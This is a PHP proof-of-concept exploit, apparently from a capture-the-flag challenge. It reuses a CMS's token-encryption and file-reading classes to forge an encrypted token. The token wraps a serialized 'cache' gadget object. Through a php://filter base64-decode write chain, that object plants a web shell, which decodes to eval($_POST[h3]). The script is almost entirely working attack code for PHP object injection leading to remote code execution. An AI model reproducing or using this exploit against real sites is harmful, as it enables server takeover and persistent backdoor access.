<?php

class token_lib
{
    private $keyid = '';
    private $keyc_length = 6;
    private $keya;
    private $keyb;
    private $time;
    private $expiry = 3600;
    private $encode_type = 'api_code'; //仅支持 api_code 和 public_key
    private $public_key = '';
    private $private_key = '';
    
    public function __construct()
    {
        $this->time = time();
    }


    public function etype($type="")
    {
        if($type && in_array($type,array('api_code','public_key'))){
            $this->encode_type = $type;
        }
        return $this->encode_type;
    }

    public function public_key($key='')
    {
        if($key){
            $this->public_key = $key;
        }
        return $this->public_key;
    }

    public function private_key($key='')
    {
        if($key){
            $this->private_key = $key;
        }
        return $this->private_key;
    }

    /**
     * 自定义密钥
     * @参数 $keyid 密钥内容
    **/
    public function keyid($keyid='')
    {
        if(!$keyid){
            return $this->keyid;
        }
        $this->keyid = strtolower(md5($keyid));
        $this->config();
        return $this->keyid;
    }

    private function config()
    {
        if(!$this->keyid){
            return false;
        }
        $this->keya = md5(substr($this->keyid, 0, 16));
        $this->keyb = md5(substr($this->keyid, 16, 16));
    }

    /**
     * 设置超时
     * @参数 $time 超时时间，单位是秒
    **/
    public function expiry($time=0)
    {
        if($time && $time > 0){
            $this->expiry = $time;
        }
        return $this->expiry;
    }

    /**
     * 加密数据
     * @参数 $string 要加密的数据，数组或字符
    **/
    public function encode($string)
    {
        if($this->encode_type == 'public_key'){
            return $this->encode_rsa($string);
        }
        if(!$this->keyid){
            return false;
        }
        $string = serialize($string);
        $expiry_time = $this->expiry ? $this->expiry : 365*24*3600;
        $string = sprintf('%010d',($expiry_time + $this->time)).substr(md5($string.$this->keyb), 0, 16).$string;    
        $keyc = substr(md5(microtime().rand(1000,9999)), -$this->keyc_length);
        $cryptkey = $this->keya.md5($this->keya.$keyc);
        $rs = $this->core($string,$cryptkey);
        return $keyc.str_replace('=', '', base64_encode($rs));
    }

    /**
     * 基于公钥加密
    **/
    private function encode_rsa($string)
    {
        if(!$this->public_key){
            return false;
        }
        $string = serialize($string);
        $crypto = '';
        $tlist = str_split($string,117);
        foreach($tlist as $key=>$value){
            openssl_public_encrypt($value,$data,$this->public_key);
            $crypto .= $data;
        }
        return base64_encode($crypto);
    }

    /**
     * 解密
     * @参数 $string 要解密的字串
    **/
    public function decode($string)
    {
        if($this->encode_type == 'public_key'){
            return $this->decode_rsa($string);
        }
        if(!$this->keyid){
            return false;
        }
        $string = str_replace(' ','+',$string);
        $keyc = substr($string, 0, $this->keyc_length);
        $string = base64_decode(substr($string, $this->keyc_length));
        $cryptkey = $this->keya.md5($this->keya.$keyc);
        $rs = $this->core($string,$cryptkey);
        $chkb = substr(md5(substr($rs,26).$this->keyb),0,16);
        if((substr($rs, 0, 10) - $this->time > 0) && substr($rs, 10, 16) == $chkb){
            $info = substr($rs, 26);
            return unserialize($info);
        }
        return false;
    }

    /**
     * 基于私钥解密
    **/
    public function decode_rsa($string)
    {
        if(!$this->private_key){
            return false;
        }
        $crypto = '';
        $tlist = str_split(base64_decode($string),128);
        foreach($tlist as $key=>$value){
            openssl_private_decrypt($value,$data,$this->private_key);
            $crypto .= $data;
        }
        if($crypto){
            return unserialize($crypto);
        }
        return false;
    }

    private function core($string,$cryptkey)
    {
        $key_length = strlen($cryptkey);
        $string_length = strlen($string);
        $result = '';
        $box = range(0, 255);
        $rndkey = array();
        // 产生密匙簿
        for($i = 0; $i <= 255; $i++){
            $rndkey[$i] = ord($cryptkey[$i % $key_length]);
        }
        // 用固定的算法，打乱密匙簿，增加随机性，好像很复杂，实际上并不会增加密文的强度
        for($j = $i = 0; $i < 256; $i++){
            $j = ($j + $box[$i] + $rndkey[$i]) % 256;
            $tmp = $box[$i];
            $box[$i] = $box[$j];
            $box[$j] = $tmp;
        }
        // 核心加解密部分
        for($a = $j = $i = 0; $i < $string_length; $i++){
            $a = ($a + 1) % 256;
            $j = ($j + $box[$a]) % 256;
            $tmp = $box[$a];
            $box[$a] = $box[$j];
            $box[$j] = $tmp;
            $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
        }
        return $result;
    }
}

class file_lib
{
    public $read_count;
    private $safecode = "<?php die('forbidden'); ?>\n";
    public function __construct()
    {
        $this->read_count = 0;
    }

    public function cat($file="",$length=0,$filter=true)
    {
        if(!$file){
            return false;
        }
        if(strpos($file,"://") !== false && strpos($file,'file://') === false){
            return $this->remote($file);
        }
        if(!file_exists($file)){
            return false;
        }
        $this->read_count++;
        
        if($length && is_numeric($length)){
            $maxlength = $length;
            if($filter){
                $maxlength = $length + strlen($this->safecode);
            }
            $fp = fopen($file,'rb');
            if(!$fp){
                return false;
            }
            $content = fread($fp,$maxlength);
            fclose($fp);
        }else{
            $content = file_get_contents($file);
        }
        if(!$content){
            return false;
        }
        if($filter || (is_bool($length) && $length)){
            $content = str_replace($this->safecode,'',$content);
        }
        return $content;
    }
}

class cache{
    protected $key_id='h3rmesk1t';
    protected $key_list='aaaaaIDw/cGhwIGV2YWwoJF9QT1NUW2gzXSk7cGhwaW5mbygpOz8+';
    protected $folder='php://filter/write=string.strip_tags|convert.base64-decode/resource=';
}
//echo base64_encode(serialize(new cache()));


$token = new token_lib();
$file = new file_lib();
$keyid = $file->cat("index.php");
$token->keyid($keyid);

echo $token->encode(new cache());

